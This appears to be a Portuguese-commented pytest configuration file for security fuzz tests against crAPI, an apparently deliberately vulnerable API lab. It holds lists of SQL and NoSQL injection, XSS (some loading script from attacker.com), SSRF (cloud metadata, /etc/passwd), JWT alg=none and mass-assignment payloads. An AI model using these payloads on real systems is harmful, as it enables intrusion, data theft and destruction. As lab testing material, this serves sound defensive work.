"""
Configuração compartilhada para testes de fuzzing do crAPI
"""
import pytest
import os
import sys
import json
import uuid
from typing import Dict, Any, Optional
import requests
from dotenv import load_dotenv

# Carregar variáveis de ambiente
load_dotenv()

# Configurações de teste
IDENTITY_BASE_URL = os.getenv("IDENTITY_URL", "http://localhost:8080")
WORKSHOP_BASE_URL = os.getenv("WORKSHOP_URL", "http://localhost:8000")
COMMUNITY_BASE_URL = os.getenv("COMMUNITY_URL", "http://localhost:8087")
CHATBOT_BASE_URL = os.getenv("CHATBOT_URL", "http://localhost:8080")
GATEWAY_BASE_URL = os.getenv("GATEWAY_URL", "http://localhost:8090")

# Credenciais de teste
TEST_USER_EMAIL = "fuzz_test@example.com"
TEST_USER_PASSWORD = "TestPassword123!"
TEST_USER_PHONE = "+1234567890"
TEST_USER_NAME = "Fuzz Tester"

# Gateway Service Basic Auth
GATEWAY_USERNAME = "vendorcrapi"
GATEWAY_PASSWORD = "Pa$$4Vendor_1"


class APITestClient:
    """Cliente para chamadas de API com suporte a autenticação JWT"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.token: Optional[str] = None
        self.session = requests.Session()
    
    def set_token(self, token: str):
        """Define o token JWT para requisições autenticadas"""
        self.token = token
    
    def get_headers(self, with_auth: bool = True) -> Dict[str, str]:
        """Retorna headers padrão para requisições"""
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
        if with_auth and self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        return headers
    
    def request(self, method: str, endpoint: str, 
                json_data: Any = None, 
                with_auth: bool = True,
                params: Dict = None,
                **kwargs) -> requests.Response:
        """Faz uma requisição HTTP"""
        url = f"{self.base_url}{endpoint}"
        headers = self.get_headers(with_auth=with_auth)
        
        try:
            response = self.session.request(
                method=method,
                url=url,
                json=json_data,
                headers=headers,
                params=params,
                timeout=10,
                **kwargs
            )
            return response
        except Exception as e:
            raise APIClientError(f"Erro ao fazer requisição: {str(e)}")
    
    def get(self, endpoint: str, with_auth: bool = True, **kwargs) -> requests.Response:
        return self.request("GET", endpoint, with_auth=with_auth, **kwargs)
    
    def post(self, endpoint: str, json_data: Any = None, 
             with_auth: bool = True, **kwargs) -> requests.Response:
        return self.request("POST", endpoint, json_data=json_data, 
                          with_auth=with_auth, **kwargs)
    
    def put(self, endpoint: str, json_data: Any = None, 
            with_auth: bool = True, **kwargs) -> requests.Response:
        return self.request("PUT", endpoint, json_data=json_data, 
                          with_auth=with_auth, **kwargs)
    
    def delete(self, endpoint: str, with_auth: bool = True, **kwargs) -> requests.Response:
        return self.request("DELETE", endpoint, with_auth=with_auth, **kwargs)


class APIClientError(Exception):
    """Erro do cliente de API"""
    pass


@pytest.fixture(scope="session")
def identity_client():
    """Cliente para Identity Service"""
    return APITestClient(IDENTITY_BASE_URL)


@pytest.fixture(scope="session")
def workshop_client():
    """Cliente para Workshop Service"""
    return APITestClient(WORKSHOP_BASE_URL)


@pytest.fixture(scope="session")
def community_client():
    """Cliente para Community Service"""
    return APITestClient(COMMUNITY_BASE_URL)


@pytest.fixture(scope="session")
def chatbot_client():
    """Cliente para Chatbot Service"""
    return APITestClient(CHATBOT_BASE_URL)


@pytest.fixture(scope="session")
def gateway_client():
    """Cliente para Gateway Service"""
    return APITestClient(GATEWAY_BASE_URL)


@pytest.fixture(scope="function")
def test_user_token(identity_client):
    """Obtém um token JWT válido para testes (escopo por teste para isolamento)"""
    # Gerar email único para cada teste
    unique_email = f"fuzz_test_{uuid.uuid4().hex[:8]}@example.com"
    
    signup_data = {
        "email": unique_email,
        "password": TEST_USER_PASSWORD,
        "number": TEST_USER_PHONE,
        "name": TEST_USER_NAME
    }
    
    # Criar novo usuário
    response = identity_client.post(
        "/identity/api/auth/signup",
        json_data=signup_data,
        with_auth=False
    )
    
    # Se signup falha, tentar login (usuário pode já existir)
    if response.status_code != 200 and response.status_code != 201:
        login_data = {
            "email": unique_email,
            "password": TEST_USER_PASSWORD
        }
        response = identity_client.post(
            "/identity/api/auth/login",
            json_data=login_data,
            with_auth=False
        )
    
    # Extrai e retorna o token
    if response.status_code in [200, 201]:
        try:
            token = response.json().get("token")
            if token:
                return token
        except:
            pass
    
    raise APIClientError(f"Não foi possível obter token de autenticação (status: {response.status_code})")


@pytest.fixture
def authenticated_identity_client(identity_client, test_user_token):
    """Cliente Identity autenticado"""
    identity_client.set_token(test_user_token)
    return identity_client


@pytest.fixture
def authenticated_workshop_client(workshop_client, test_user_token):
    """Cliente Workshop autenticado"""
    workshop_client.set_token(test_user_token)
    return workshop_client


@pytest.fixture
def authenticated_community_client(community_client, test_user_token):
    """Cliente Community autenticado"""
    community_client.set_token(test_user_token)
    return community_client


@pytest.fixture
def authenticated_chatbot_client(chatbot_client, test_user_token):
    """Cliente Chatbot autenticado"""
    chatbot_client.set_token(test_user_token)
    return chatbot_client


# ============================================================================
# PAYLOADS FIXTURES - Injeção, Autenticação, etc.
# ============================================================================

@pytest.fixture
def sql_injection_payloads():
    """Payloads de SQL Injection para testes"""
    return [
        "'",
        "' OR '1'='1",
        "' OR 'a'='a",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users--",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
        "admin' --",
        "' OR 1=1--",
        "' OR 1=1 /*",
        "1' ORDER BY 1--",
        "1' AND 1=1 UNION SELECT NULL--",
        "' ) OR ( '1'='1",
    ]


@pytest.fixture
def nosql_injection_payloads():
    """Payloads de NoSQL Injection (MongoDB)"""
    return [
        {"$ne": None},
        {"$ne": ""},
        {"$gt": ""},
        {"$regex": ".*"},
        {"$where": "1==1"},
        '{"$where": "1==1"}',
        {"$where": "this.password=='123'"},
        {"$or": [{"$ne": None}]},
        {"$nor": [{"$eq": None}]},
        '"; db.collection.find(); //',
        "'; db.collection.updateOne({}, {$set: {admin: true}}); //",
    ]


@pytest.fixture
def xss_payloads():
    """Payloads de Cross-Site Scripting (XSS)"""
    return [
        "<script>alert('xss')</script>",
        "'\"><script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "javascript:alert('xss')",
        "<iframe src=javascript:alert('xss')>",
        "<body onload=alert('xss')>",
        "<input onfocus=alert('xss') autofocus>",
        "<marquee onstart=alert('xss')>",
        "';alert('xss');//",
        "<style>@import'http://attacker.com';</style>",
        "<<SCRIPT>alert('xss');//<</SCRIPT>",
        "<img src=\"\" onerror=\"alert('xss')\">",
        "%3Cscript%3Ealert('xss')%3C/script%3E",
        "<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>",
    ]


@pytest.fixture
def ssrf_payloads():
    """Payloads de Server-Side Request Forgery (SSRF)"""
    return [
        "http://localhost:8080",
        "http://127.0.0.1:8080",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
        "http://169.254.169.254/metadata/v1/",  # Azure metadata
        "http://localhost:6379",  # Redis
        "http://localhost:5432",  # PostgreSQL
        "http://localhost:3306",  # MySQL
        "http://localhost:27017",  # MongoDB
        "http://localhost:9200",  # Elasticsearch
        "file:///etc/passwd",
        "file:///../../../etc/passwd",
        "gopher://localhost:25/",  # GOPHER protocol
        "dict://localhost:11211/",  # Memcached
    ]


@pytest.fixture
def jwt_bypass_payloads():
    """Payloads para bypass de JWT"""
    return [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjogImFkbWluIn0.",  # alg=none
        "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFkbWluIn0.",  # Invalid signature
        "",  # Empty token
        "invalid.token.format",
        "..",  # Just dots
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ",  # Valid but modified header
    ]


@pytest.fixture
def authentication_bypass_payloads():
    """Payloads para bypass de autenticação"""
    return [
        {"email": "", "password": ""},
        {"email": "admin", "password": "admin"},
        {"email": "admin@example.com", "password": "admin"},
        {"email": "' OR '1'='1", "password": "' OR '1'='1"},
        {"email": "admin' --", "password": "anything"},
        {"email": {"$ne": None}, "password": {"$ne": None}},
        {"email": "admin", "password": {"$gt": ""}},
        {"email": None, "password": None},
        {"email": " ", "password": " "},
        {"email": "\n", "password": "\n"},
    ]


@pytest.fixture
def mass_assignment_payloads():
    """Payloads para testes de Mass Assignment"""
    return [
        {"admin": True},
        {"is_admin": True},
        {"role": "admin"},
        {"permission_level": 999},
        {"is_superuser": True},
        {"user_id": 1},
        {"user_role": "admin"},
        {"privileges": ["read", "write", "delete"]},
        {"is_paid": True},
        {"is_verified": True},
        {"access_level": 10},
        {"bypass_auth": True},
    ]


# ============================================================================
# HOOKS para logging de erros
@pytest.hookimpl(tryfirst=True, hookwrapper=True)
def pytest_runtest_makereport(item, call):
    """Hook para capturar informações de falha em testes de fuzzing"""
    outcome = yield
    rep = outcome.get_result()
    
    if rep.failed and "fuzz" in item.nodeid.lower():
        # Log adicional para testes de fuzzing
        if hasattr(item, 'funcargs'):
            pass  # Poderia fazer log dos argumentos de fuzzing aqui
